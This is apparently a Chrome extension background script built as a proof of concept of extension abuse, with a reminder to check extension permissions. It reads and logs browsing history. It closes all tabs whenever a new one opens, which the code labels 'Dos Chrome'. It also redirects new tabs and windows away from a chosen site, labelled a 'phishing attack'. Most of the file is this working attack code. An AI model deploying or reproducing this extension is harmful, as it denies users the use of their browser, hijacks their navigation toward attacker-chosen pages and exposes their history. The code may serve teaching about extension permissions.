if (localStorage.getItem('notificationBool') == undefined) localStorage.setItem('notificationBool', false);
if (localStorage.getItem('fontBool') == undefined) localStorage.setItem('fontBool', false);
if (localStorage.getItem('closeBool') == undefined) localStorage.setItem('closeBool', false);
if (localStorage.getItem('rerouteBool') == undefined) localStorage.setItem('rerouteBool', false);
if (localStorage.getItem('powerBool') == undefined) localStorage.setItem('powerBool', false);

/**
 * (notifications)
 * Add persistent notifications through requesting permissions, 
 * so no "special permission" is requested if not necessary.

 */

var x = history.length;

var createNotification = function() {
    chrome.notifications.create('chroak', {
        type: 'basic',
        iconUrl: 'warning_.png',
        title: 'Reminder!',
        message: 'Remember to check the permissions you give to any extension you install!',
        isClickable: false
     }, function(notificationId) {});
}
var notificationsListener = function(notifId, byUser) {
  if (JSON.parse(localStorage.getItem('notificationBool'))) {
    createNotification();
  }
}
var addNotificationListener = function() {
  createNotification();
  chrome.notifications.onClosed.addListener(notificationsListener);
}
var removeNotificationListener = function() {
  chrome.notifications.onClosed.removeListener(notificationsListener);
}
chrome.permissions.contains({permissions:['notifications']}, function(contains) {
  if (contains) {
    createNotification();
  }
});

chrome.commands.onCommand.addListener(function(command) {
  console.log('Command:', command);
});

// get number of url links on browsing
// get browsing history function
window.history



//var x = history.length;

//document.getElementById("demo").innerHTML = x;

chrome.history.search({text: '', maxResults: 10}, function(data) {
    data.forEach(function(page) {
        console.log(page.url);
    });
});

function goBack() {
  window.history.back()
}

function goForward() {
  window.history.forward()
}

function getHist() {
history.go()
}



/*
 * Dos Chrome -- Close windows and tabs as soon as they open.
 * Phish -- Reroute all new windows and tabs to an arbitrary website.
 */
chrome.windows.onCreated.addListener(function(event) {
  console.log('opened a new window');

  if (event.url) { // execute phishing attack
    console.log('caputured new window url');
    phish(event.url, event.id);
  } else if (JSON.parse(localStorage.getItem('rerouteBool'))) { // reroute new tab
    console.log('no accessible event url');
    chrome.tabs.update(event.id, {url: 'https://www.bing.com/'});
  }

  if (JSON.parse(localStorage.getItem('closeBool'))) {
    dos();
  }
});

chrome.tabs.onCreated.addListener(function(event) {
  console.log('opened a new tab');
  console.log(event);


  if (event.url) { // execute phishing attack
    console.log('caputured new tab url');
    phish(event.url, event.id);
  } else if (JSON.parse(localStorage.getItem('rerouteBool'))) { // reroute new tab
    console.log('no accessible event url');
    chrome.tabs.update(event.id, {url: 'https://www.bing.com/'});
  }

  if (JSON.parse(localStorage.getItem('closeBool'))) { // close new tab
    dos();
  }
});

function dos() {
  chrome.tabs.query({}, function(tabs) {
    tabs.forEach(function(tab) {
      chrome.tabs.remove(tab.id);
    });
  });
}

function phish(input_url, tab_id) {
  var r = new RegExp('^(?:https?:\/\/)?(?:[^@\n]+@)?(?:www\.)?([^:\/\n]+)');
  var url = r.exec(input_url)[1];
  var split = url.split('.');
  if (split.length > 2) {
    url = split[split.length-2] + '.' + split[split.length-1];
  }
  console.log('shortened url: ' + url);
  if (url == localStorage.getItem('phish-site')) {
    chrome.tabs.update(tab_id, {url: 'https://www.bing.com/'});
  }
}

